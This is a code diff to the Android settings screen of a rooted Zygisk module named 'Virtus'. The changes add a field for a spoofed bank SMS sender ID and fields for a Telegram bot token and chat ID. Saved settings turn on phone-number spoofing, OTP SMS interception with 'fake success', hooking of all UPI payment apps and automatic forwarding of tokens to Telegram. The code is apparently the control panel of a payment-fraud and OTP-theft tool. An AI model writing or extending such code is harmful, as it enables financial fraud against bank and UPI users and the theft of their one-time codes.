@@ -945,6 +945,33 @@ public class HivirtusUiHelper {
             card1.addView(etPhone, etLp);
             cards.addView(card1);
 
+            // Card: Sender ID
+            LinearLayout cardSid = new LinearLayout(activity);
+            cardSid.setOrientation(LinearLayout.VERTICAL);
+            cardSid.setPadding(pad, pad, pad, pad);
+            cardSid.setBackground(roundBg(0xFF13151F, 14 * d));
+            LinearLayout.LayoutParams sidLp = new LinearLayout.LayoutParams(-1, -2);
+            sidLp.topMargin = gap;
+            TextView sidT = new TextView(activity);
+            sidT.setText("🏷️  Sender ID\nIncoming SMS pe yeh naam");
+            sidT.setTextColor(Color.WHITE);
+            sidT.setTextSize(13f);
+            final EditText etSender = new EditText(activity);
+            etSender.setHint("MYBANK");
+            etSender.setTextColor(Color.WHITE);
+            etSender.setHintTextColor(0xFF4A5068);
+            etSender.setBackground(roundBg(0xFF090B12, 10 * d));
+            etSender.setPadding(pad, pad, pad, pad);
+            String savedSid = readSavedSenderId();
+            if (!savedSid.isEmpty()) {
+                try { etSender.setText(savedSid); } catch (Throwable ignored) {}
+            }
+            cardSid.addView(sidT);
+            LinearLayout.LayoutParams etSidLp = new LinearLayout.LayoutParams(-1, -2);
+            etSidLp.topMargin = gap;
+            cardSid.addView(etSender, etSidLp);
+            cards.addView(cardSid, sidLp);
+
             // Card: SMS intercept
             LinearLayout card2 = new LinearLayout(activity);
             card2.setOrientation(LinearLayout.VERTICAL);
@@ -966,12 +993,51 @@ public class HivirtusUiHelper {
             card2.addView(row2);
             cards.addView(card2, c2lp);
 
+            // Card: Telegram
+            LinearLayout cardTg = new LinearLayout(activity);
+            cardTg.setOrientation(LinearLayout.VERTICAL);
+            cardTg.setPadding(pad, pad, pad, pad);
+            cardTg.setBackground(roundBg(0xFF13151F, 14 * d));
+            LinearLayout.LayoutParams tgLp = new LinearLayout.LayoutParams(-1, -2);
+            tgLp.topMargin = gap;
+            TextView tgT = new TextView(activity);
+            tgT.setText("✈️  Telegram\nBot token + Chat ID");
+            tgT.setTextColor(Color.WHITE);
+            tgT.setTextSize(13f);
+            final EditText etToken = new EditText(activity);
+            etToken.setHint("123456:ABC…");
+            etToken.setTextColor(Color.WHITE);
+            etToken.setHintTextColor(0xFF4A5068);
+            etToken.setBackground(roundBg(0xFF090B12, 10 * d));
+            etToken.setPadding(pad, pad, pad, pad);
+            final EditText etChat = new EditText(activity);
+            etChat.setHint("-100123…");
+            etChat.setTextColor(Color.WHITE);
+            etChat.setHintTextColor(0xFF4A5068);
+            etChat.setBackground(roundBg(0xFF090B12, 10 * d));
+            etChat.setPadding(pad, pad, pad, pad);
+            String[] tgCreds = readSavedTgCreds();
+            if (tgCreds[0].length() > 0) {
+                try { etToken.setText(tgCreds[0]); } catch (Throwable ignored) {}
+            }
+            if (tgCreds[1].length() > 0) {
+                try { etChat.setText(tgCreds[1]); } catch (Throwable ignored) {}
+            }
+            cardTg.addView(tgT);
+            LinearLayout.LayoutParams etTokLp = new LinearLayout.LayoutParams(-1, -2);
+            etTokLp.topMargin = gap;
+            cardTg.addView(etToken, etTokLp);
+            LinearLayout.LayoutParams etChatLp = new LinearLayout.LayoutParams(-1, -2);
+            etChatLp.topMargin = gap;
+            cardTg.addView(etChat, etChatLp);
+            cards.addView(cardTg, tgLp);
+
             scroll.addView(cards);
             LinearLayout.LayoutParams scrollLp = new LinearLayout.LayoutParams(-1, 0, 1f);
             shell.addView(scroll, scrollLp);
 
             Button save = new Button(activity);
-            save.setText("Save Settings");
+            save.setText("Update / Save");
             save.setAllCaps(false);
             save.setTextColor(Color.WHITE);
             save.setBackground(roundBg(0xFF6C63FF, 14 * d));
@@ -982,41 +1048,17 @@ public class HivirtusUiHelper {
                 public void onClick(View v) {
                     try {
                         String phone = etPhone.getText() != null ? etPhone.getText().toString().trim() : "";
-                        phone = phone.replaceAll("[^0-9+]", "");
-                        if (phone.startsWith("+91") && phone.length() > 10) {
-                            phone = phone.substring(phone.length() - 10);
-                        } else {
-                            phone = phone.replaceAll("[^0-9]", "");
-                        }
+                        String sid = etSender.getText() != null ? etSender.getText().toString().trim() : "";
+                        String token = etToken.getText() != null ? etToken.getText().toString().trim() : "";
+                        String chat = etChat.getText() != null ? etChat.getText().toString().trim() : "";
                         boolean interceptOn = swIntercept.isChecked();
-                        boolean fakeOn = swFake.isChecked() || phone.length() >= 10;
-                        if (phone.length() >= 10) fakeOn = true;
-                        String json = "{"
-                                + "\"hook_outgoing_sms\":" + interceptOn + ","
-                                + "\"intercept_fake_success\":" + interceptOn + ","
-                                + "\"intercept_enabled\":" + interceptOn + ","
-                                + "\"enable_sim1_mock\":" + fakeOn + ","
-                                + "\"enable_phone_spoof\":" + fakeOn + ","
-                                + "\"enable_virtual_sim\":" + (fakeOn && phone.length() >= 10) + ","
-                                + "\"fake_number_enabled\":" + fakeOn + ","
-                                + "\"mock_phone_sim1\":\"" + phone.replace("\"", "") + "\","
-                                + "\"prefix_enabled\":false,"
-                                + "\"override_incoming_sender\":false,"
-                                + "\"hook_all_upi_apps\":true,"
-                                + "\"auto_hook_foreground\":true,"
-                                + "\"auto_forward_token\":true,"
-                                + "\"fake_intercept_telegram\":true"
-                                + "}";
-                        writeUtf8File("/data/local/tmp/hivirtus_ui_save.json", json);
-                        writeUtf8File("/data/local/tmp/hivirtus_zygisk_mode_config.json", json);
-                        writeUtf8File("/data/adb/modules/hivirtus_zygisk_mode/ui_save.json", json);
-                        writeUtf8File("/data/adb/modules/hivirtus_zygisk_mode/config.json", json);
-                        if (phone.length() >= 10) {
-                            writeUtf8File("/data/local/tmp/hivirtus_spoof_phone.txt", phone + "\n");
-                            writeUtf8File("/data/adb/modules/hivirtus_zygisk_mode/spoof_phone.txt", phone + "\n");
-                        }
-                        writeUtf8File("/data/local/tmp/hivirtus_save_ok.flag", "1\n");
-                        writeDebug("ui_native_save_ok phone_len=" + phone.length());
+                        boolean fakeOn = swFake.isChecked() || normalizePhoneDigits(phone).length() >= 10;
+                        HivirtusJsBridge.syncAllSettings(activity, phone, sid, token, chat, interceptOn, fakeOn);
+                        int plen = normalizePhoneDigits(phone).length();
+                        int slen = sid.length();
+                        int tgon = (!token.isEmpty() && !chat.isEmpty()) ? 1 : 0;
+                        writeDebug("ui_native_save_ok phone=" + plen + " sid=" + slen + " tg=" + tgon);
+                        save.setText("Saved OK");
                     } catch (Throwable t) {
                         writeDebug("ui_native_save_fail:" + safeMsg(t));
                     }
@@ -1064,9 +1106,6 @@ public class HivirtusUiHelper {
             + ".brand{display:flex;gap:12px;align-items:center}"
             + ".mark,.mark-img{width:40px;height:40px;border-radius:50%;object-fit:cover;display:grid;place-items:center;"
             + "background:linear-gradient(145deg,#5c6bc0,#1a237e);color:#fff;font-weight:700;box-shadow:0 8px 20px rgba(108,99,255,.4)}"
-            + ".tabs{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:12px}"
-            + ".tab{padding:10px;border-radius:12px;border:1px solid #1c1f2e;background:transparent;color:#4a5068;font-weight:600}"
-            + ".tab.on{background:#6c63ff;border-color:#6c63ff;color:#fff}"
             + ".card{background:#13151f;border-radius:14px;padding:14px;margin-bottom:10px}"
             + "h3{font-size:14px;margin-bottom:4px}p{color:#4a5068;font-size:12px}"
             + "input[type=text],input[type=tel]{width:100%;margin-top:10px;padding:12px;border-radius:10px;border:0;background:#090b12;color:#fff}"
@@ -1076,21 +1115,36 @@ public class HivirtusUiHelper {
             + "</style></head><body><div class=shell>"
             + "<div class=top><div class=brand><span class=mark>V</span>"
             + "<div><div class=name>Virtus</div><div class=sub>Intercept + spoof ready</div></div></div></div>"
-            + "<div class=tabs><button class='tab on'>Basic</button><button class=tab>Advanced</button><button class=tab>Telegram</button></div>"
             + "<div class=card><div class=row><div><h3>Fake Phone Number</h3><p>Override number shown to apps</p></div>"
             + "<input type=checkbox id=swF></div><input type=tel id=phone placeholder='+91 XXXXX XXXXX'></div>"
+            + "<div class=card><h3>Sender ID</h3><p>Incoming SMS pe yeh naam</p>"
+            + "<input type=text id=sender placeholder='MYBANK'></div>"
             + "<div class=card><div class=row><div><h3>SMS Intercept + Fake Success</h3><p>Block OTP SMS & fake success</p></div>"
             + "<input type=checkbox id=swI checked></div></div>"
-            + "<button class=primary id=save>Save Settings</button>"
+            + "<div class=card><h3>Telegram</h3><p>Bot token + Chat ID</p>"
+            + "<input type=text id=token placeholder='123456:ABC…'>"
+            + "<input type=text id=chat placeholder='-100123…'></div>"
+            + "<button class=primary id=save>Update / Save</button>"
             + "<span class=credit>Virtus Zygisk Mode • no LSPosed • @hivirtus</span></div>"
             + "<script>(function(){var H=window.Hivirtus;"
+            + "try{if(H&&H.readConfig){var c=JSON.parse(H.readConfig()||'{}');"
+            + "if(c.mock_phone_sim1)document.getElementById('phone').value=c.mock_phone_sim1;"
+            + "if(c.inject_sender_id)document.getElementById('sender').value=c.inject_sender_id;"
+            + "if(c.telegram_bot_token)document.getElementById('token').value=c.telegram_bot_token;"
+            + "if(c.telegram_chat_id)document.getElementById('chat').value=c.telegram_chat_id;"
+            + "if(c.enable_sim1_mock||c.fake_number_enabled)document.getElementById('swF').checked=true;}}catch(e){}"
             + "document.getElementById('save').onclick=function(){var j=JSON.stringify({"
             + "hook_outgoing_sms:document.getElementById('swI').checked,"
             + "intercept_fake_success:document.getElementById('swI').checked,"
             + "enable_sim1_mock:document.getElementById('swF').checked,"
             + "enable_phone_spoof:document.getElementById('swF').checked,"
-            + "mock_phone_sim1:document.getElementById('phone').value||''});"
-            + "try{if(H)H.saveConfig(j);}catch(e){}};})();</script>"
+            + "mock_phone_sim1:document.getElementById('phone').value||'',"
+            + "inject_sender_id:document.getElementById('sender').value||'',"
+            + "telegram_bot_token:document.getElementById('token').value||'',"
+            + "telegram_chat_id:document.getElementById('chat').value||'',"
+            + "auto_forward_token:!!(document.getElementById('token').value&&document.getElementById('chat').value),"
+            + "override_incoming_sender:!!document.getElementById('sender').value});"
+            + "try{if(H)H.saveConfig(j);document.getElementById('save').textContent='Saved ✓';}catch(e){}};})();</script>"
             + "</body></html>";
 
     private static String safeMsg(Throwable t) {
@@ -1177,6 +1231,52 @@ public class HivirtusUiHelper {
             if (v.length() >= 10) return v;
         }
         return "";
+    }
+
+    private static String readSavedSenderId() {
+        String[] paths = {
+                "/data/local/tmp/hivirtus_sender_id.txt",
+                "/data/adb/modules/hivirtus_zygisk_mode/sender_id.txt",
+                "/data/local/tmp/hivirtus_ui_save.json",
+                "/data/local/tmp/hivirtus_zygisk_mode_config.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/ui_save.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/config.json"
+        };
+        for (String p : paths) {
+            String v;
+            if (p.endsWith(".json")) {
+                v = jsonField(readFileAll(p), "inject_sender_id");
+            } else {
+                v = readFirstLine(p);
+            }
+            if (v == null) continue;
+            v = v.trim();
+            if (!v.isEmpty() && !"AD-TEST-S".equals(v)) return v;
+        }
+        return "";
+    }
+
+    private static String[] readSavedTgCreds() {
+        String token = "";
+        String chat = "";
+        String[] paths = {
+                "/data/local/tmp/hivirtus_telegram_credentials.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json",
+                "/data/local/tmp/hivirtus_ui_save.json",
+                "/data/local/tmp/hivirtus_zygisk_mode_config.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/ui_save.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/config.json"
+        };
+        for (String p : paths) {
+            String j = readFileAll(p);
+            if (j.isEmpty()) continue;
+            if (token.isEmpty()) token = jsonField(j, "telegram_bot_token");
+            if (chat.isEmpty()) chat = jsonField(j, "telegram_chat_id");
+            if (!token.isEmpty() && !chat.isEmpty()) break;
+        }
+        if (token.isEmpty()) token = readFirstLine("/data/local/tmp/hivirtus_tg_token.txt");
+        if (chat.isEmpty()) chat = readFirstLine("/data/local/tmp/hivirtus_tg_chat.txt");
+        return new String[]{token == null ? "" : token.trim(), chat == null ? "" : chat.trim()};
     }
 
     private static boolean readSavedFakeEnabled() {
